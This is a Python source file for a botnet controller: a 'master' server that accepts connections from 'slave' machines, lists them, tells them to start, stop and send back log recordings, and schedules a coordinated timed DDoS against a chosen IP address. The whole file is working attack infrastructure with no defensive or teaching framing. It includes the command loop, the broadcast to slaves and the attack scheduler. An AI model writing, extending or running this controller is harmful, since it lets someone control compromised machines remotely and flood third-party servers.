from time import sleep
from datetime import datetime
from socket import socket, timeout
from threading import Thread
from argparse import ArgumentParser
import logging


class Master:
    def __init__(self, address: str = "", port: int = 50000):
        self.server_address = address
        self.server_port = port
        self.socket = socket()
        self.socket.settimeout(1)
        self.connected_socket_list = []
        self.connected_address_list = []
        self.planned_attacks = []
        self.stop = False
        self.log_file = "master.log"
        self.slaves_connected = 0
        self.encoding = "UTF-8"
        self.waiting_connection = Thread(target=self.__waiting_for_connection,
                                         name="WaitingConnection")
        self.listening_message = Thread(target=self.__listening_message,
                                        name="ListeningMessage")

    def start(self):
        logging.basicConfig(
            filename=self.log_file,
            datefmt='%y-%m-%d %H:%M:%S',
            filemode='w',
            level=logging.DEBUG,
            format='%(asctime)s %(threadName)-17s %(levelname)-8s- %(message)s'
        )
        logging.info("Master started.")
        self.__print_help()
        self.__setup_socket()
        self.waiting_connection.start()
        self.listening_message.start()
        while not self.stop:
            raw_input = input()
            if raw_input != '':
                split_input = raw_input.split(" ")
                len_msg = len(split_input)
                now = datetime.now()
                if split_input[0] == "start":  # #### START #####
                    if len_msg == 1:
                        self.__start_log()
                    else:
                        print(f"[{now.hour}:{now.minute}] Too many arguments : Try like this 'start'.")
                elif split_input[0] == "stop":  # #### STOP #####
                    if len_msg == 1:
                        self.__stop_log()
                    else:
                        print(f"[{now.hour}:{now.minute}] Too many arguments : Try like this 'stop'.")
                elif split_input[0] == "get":  # #### GET #####
                    if len_msg == 2:
                        lines = int(split_input[1])
                        self.__get_log(lines)
                    else:
                        print(f"[{now.hour}:{now.minute}] Wrong syntax : Try like this 'get <lines>'.")
                elif split_input[0] == "ddos":  # #### DDOS #####
                    if len_msg == 4:
                        self.__ddos(split_input)
                    else:
                        print(
                            f"[{now.hour}:{now.minute}] "
                            f"Wrong syntax : Try like this 'ddos <ip> <yyyy/mm/dd> <hh:mm:ss>'.")

                elif split_input[0] == "help":  # #### HELP #####
                    if len_msg == 1:
                        self.__print_help()
                    else:
                        print(f"[{now.hour}:{now.minute}] Too many arguments : Try like this 'help'.")

                elif split_input[0] == "slave":  # #### SLAVE #####
                    if len_msg == 1:
                        self.__print_connected_slave()
                    else:
                        print(f"[{now.hour}:{now.minute}] Too many arguments : Try like this 'slave'.")

                elif split_input[0] == "exit":  # #### EXIT #####
                    if len_msg == 1:
                        self.__exit(0)  # Exit master only
                    elif len_msg == 2 and split_input[1] == "all":
                        self.__exit(1)  # Exit and stop slaves execution
                    else:
                        print(f"[{now.hour}:{now.minute}] Too many arguments : Try like this 'exit [all]'.")
                elif split_input[0] == "attack":
                    if len_msg == 1:
                        self.__print_planed_attack()
                    else:
                        print(f"[{now.hour}:{now.minute}] Too many arguments : Try like this 'attack'.")
                else:
                    print(f"[{now.hour}:{now.minute}] Unknown command : '{raw_input}'.")
                    logging.info("Unknown command : '{raw_input}'.")
            sleep(0.01)
        logging.info("Exiting master...")

    def __setup_socket(self):
        try:
            self.socket.bind((self.server_address, self.server_port))  # Bind socket to def address "localhost:50000"
            self.socket.listen()
        except OSError:
            print(f"/!\\ Socket {self.server_address}:{self.server_port} already used")
            logging.error("OSError > Socket already in use.")
            self.__exit(0)

    def __waiting_for_connection(self):
        while not self.stop:
            try:
                conn, address = self.socket.accept()
                conn.settimeout(0.000001)
                self.__add_slave(conn, address)
                print(f"[{datetime.now().hour}:{datetime.now().minute}] "
                      f"New slave connected : {address[0]}:{address[1]}.")
                logging.info(f"New slave connected : {address[0]}:{address[1]}.")
            except timeout:
                pass

    def __listening_message(self):
        while not self.stop:
            i = 0
            while i < self.slaves_connected and not self.stop:  # loop on every slaves to receive messages
                try:
                    msg_received = self.connected_socket_list[i].recv(1024).decode(self.encoding)
                    if msg_received == "exit":  # If message == "exit"
                        self.__remove_slave(i)  # Remove the slave
                    else:
                        now = datetime.now()
                        print(f"[{now.hour}:{now.minute}] {self.connected_address_list[i][0]}:"
                              f"{self.connected_address_list[i][1]} >>>", msg_received)
                        msg_received = " ".join(msg_received.split("\n"))  # replace "\n" with " "
                        logging.info(f"{self.connected_address_list[i][0]}:"
                                     f"{self.connected_address_list[i][1]} >>> " + msg_received)
                        i += 1
                except (ConnectionResetError, ConnectionAbortedError):  # If connection Reset ou Aborted
                    logging.error("ConnectionError > Removing slave.")
                    self.__remove_slave(i)  # Remove the disconnected slave
                except timeout:
                    pass

    def __send_message(self, target: socket, data: str):
        target.send(data.encode(self.encoding))

    def __send_message_to_all(self, data: str):
        for i in range(self.slaves_connected):
            try:
                self.__send_message(self.connected_socket_list[i], data)  # Send message
            except ConnectionResetError:  # If connection Reset
                self.__remove_slave(i)  # Remove the disconnected slave
                i -= 1

    def __add_slave(self, connection: socket, address: tuple):
        self.connected_socket_list.append(connection)  # add slave's address to address list
        self.connected_address_list.append(address)  # add slave's socket to socket list
        self.slaves_connected += 1

    def __remove_slave(self, position: int):
        now = datetime.now()
        print(f"[{now.hour}:{now.minute}] Slave {self.connected_address_list[position][0]}:"
              f"{self.connected_address_list[position][1]} disconnected.")
        logging.info(f"Slave {self.connected_address_list[position][0]}:"
                     f"{self.connected_address_list[position][1]} disconnected.")
        self.connected_socket_list[position].close()  # Closing socket with slave i
        self.connected_address_list.pop(position)  # remove slave's address from address list
        self.connected_socket_list.pop(position)  # remove slave's socket from socket list
        self.slaves_connected -= 1

    def __start_log(self):
        self.__send_message_to_all("start_log")

    def __stop_log(self):
        self.__send_message_to_all("stop_log")

    def __get_log(self, lines: int):
        data = "get_log" + " " + str(lines)
        self.__send_message_to_all(data)

    def __ddos(self, input_msg: list):
        ip = input_msg[1]  # Example "ddos 192.168.2.159 2019-11-10 19:52:28"
        date = input_msg[2].split("-")  # Split msg[2] with "-" separator into date[0->2]
        hour = input_msg[3].split(":")  # Split msg[3] with ":" separator into hour[0->2]
        if len(hour) == 3 and len(date) == 3:
            try:
                date_time = datetime(int(date[0]), int(date[1]), int(date[2]), int(hour[0]), int(hour[1]), int(hour[2]))
                if datetime.now() < date_time:
                    data = "ddos" + " " + ip + " " + input_msg[2] + " " + input_msg[3]
                    self.planned_attacks.append([ip, date_time, self.slaves_connected])
                    self.__send_message_to_all(data)
                else:
                    print(">> Date must be in future!")
                    logging.warning("Input date must be in future!")
            except ValueError:
                print(">> Invalid Date!")
                logging.error("ValueError > Invalid Date!")
        else:
            print(">> Bad format!")

    @classmethod
    def __print_help(cls):
        print(" ---------------------------------- HELP COMMANDS LIST ---------------------------------------------")
        print("  - start : Start log recording on all connected slaves.")
        print("  - stop : Stop log recording on all connected slaves.")
        print("  - get <lines> : Ask to slaves to send the last <lines> of log file.")
        print("  - ddos <ip> <yyyy/mm/dd> <hh:mm:ss> : Ask to all slaves to HTTP request <ip> on <date> at <time>.")
        print("  - help : Print this help menu.")
        print("  - slave : Print addresses of connected slaves.")
        print("  - attack : Print planed attack.")
        print("  - exit [all] : Exit master only. Add 'all' option to stop slave execution too.")
        print("----------------------------------------------------------------------------------------------------")

    def __print_connected_slave(self):
        if self.slaves_connected > 0:
            print(f"  -- Connected Slave List ({self.slaves_connected}) -- ")
            for i in range(self.slaves_connected):
                print(f"   - {self.connected_address_list[i][0]}:{self.connected_address_list[i][1]}")
        else:
            print("  -- No connected slaves --")

    def __print_planed_attack(self):
        if len(self.planned_attacks):  # If they're one or more attack planned
            print("  -- Attack Planed --")
            i = 0
            while i < len(self.planned_attacks):
                now = datetime.now()
                if self.planned_attacks[i][1] > now:  # If attack is in future, print
                    print(f"   - Target : {self.planned_attacks[i][0]}\n"
                          f"   - Time : {self.planned_attacks[i][1]}\n"
                          f"   - Time Left : {int((self.planned_attacks[i][1] - now).total_seconds())} seconds\n"
                          f"   - Slaves : {self.planned_attacks[i][2]}\n")
                    i += 1
                else:
                    self.planned_attacks.pop(i)  # If attack is done, remove from list

        else:
            print("  --  No planned attack --")

    def __exit(self, exit_code: int):
        if exit_code == 1:  # 1 =  Quit all
            if self.slaves_connected:  # If slave_connected > 0
                self.__send_message_to_all("exit")  # Send the exit message
            else:
                print("  -- No connected slaves --")
            while self.slaves_connected:  # While they're slave connected, wait they all disconnect
                sleep(0.1)
        self.stop = True  # Set the strop flag to True


def main():
    parser = ArgumentParser(add_help=False)
    parser.add_argument('address', type=str, action='store', help='Address range to listen to (empty mean all addresses)')
    parser.add_argument('port', type=int, action='store', help='Listening port')
    args = parser.parse_args()

    master = Master(args.address, args.port)
    master.start()


if __name__ == '__main__':
    main()
